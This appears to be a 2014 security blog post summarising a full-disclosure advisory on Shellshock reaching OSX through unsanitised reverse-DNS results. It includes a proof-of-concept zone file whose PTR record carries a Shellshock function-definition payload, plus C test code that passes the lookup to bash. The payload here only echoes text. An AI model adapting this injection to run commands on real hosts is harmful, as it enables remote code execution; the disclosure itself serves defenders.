---
layout: post
title: "OSX vulnerable to Shellshock through DNS reverse lookup"
description: ""
category: Security
tags: 
- OSX
- ShellShock
- Exploits
---
{% include JB/setup %}
*Dirk-Willem van Gulik* has published on [seclists.org](http://seclists.org/fulldisclosure/2014/Oct/53) a document where explains
another attack vector for the famous [Shellshock bug](http://www.andreafortuna.org/tags.html#ShellShock-ref): through a 
reverse lookup in DNS, where the results of this lookup are
passed, unsanitized, to an environment variable (e.g. as part of
a batch process).

![ShellShock](http://static.itpro.co.uk/sites/itpro/files/bash.jpg)

<!-- more -->

>This vector is subtly different from a normal attack vector, as the
attacker can 'sit back' and let a (legitimate) user trigger the
issue; hence keeping the footprint for a IDS or WAAS to act on small.

The vulnerability is fixed by [this patch](http://support.apple.com/kb/DL1769) last September 29: all OSX system without this patch are vulnerable.

How to reproduce this flaw?
---
From [seclist.org](http://seclists.org/fulldisclosure/2014/Oct/53) article:

>A simple zone file; such as:

     $TTL 10;
     $ORIGIN in-addr.arpa.
     @     IN SOA     ns.boem.wleiden.net dirkx.webweaving.org (
                    666        ; serial
                    360 180 3600 1800 ; very short lifespan.
                    )
     IN          NS     127.0.0.1
     *           PTR      "() { :;}; echo CVE-2014-6271, CVE-201407169, RDNS" 

can be used to create an environment in which to test the issue with existing code
or with the following trivial example:

    #include <sys/socket.h>
    #include <netdb.h>
    #include <assert.h>
    #include <arpa/inet.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    #include <netinet/in.h>

    int main(int argc, char ** argv) {
     struct in_addr addr;
     struct sockaddr_in sa;
     char host[1024];

     assert(argc==2);
     assert(inet_aton(argv[1],&addr) == 1);

     sa.sin_family = AF_INET;
     sa.sin_addr = addr;

     assert(0==getnameinfo((struct sockaddr *)&sa, sizeof sa,
          host, sizeof host, NULL, 0, NI_NAMEREQD));

     printf("Lookup result: %s\n\n", host);    

     assert(setenv("REMOTE_HOST",host,1) == 0);
     execl("/bin/bash",NULL);
    }

Other operating systems (e.g. RHEL6, Centos, FreeBSD 7), seem to be  
immune: in their standard configurations *libc/libresolver* and *DNS* are using 
different *escaping mechanisms* (octal v.s. decimal).
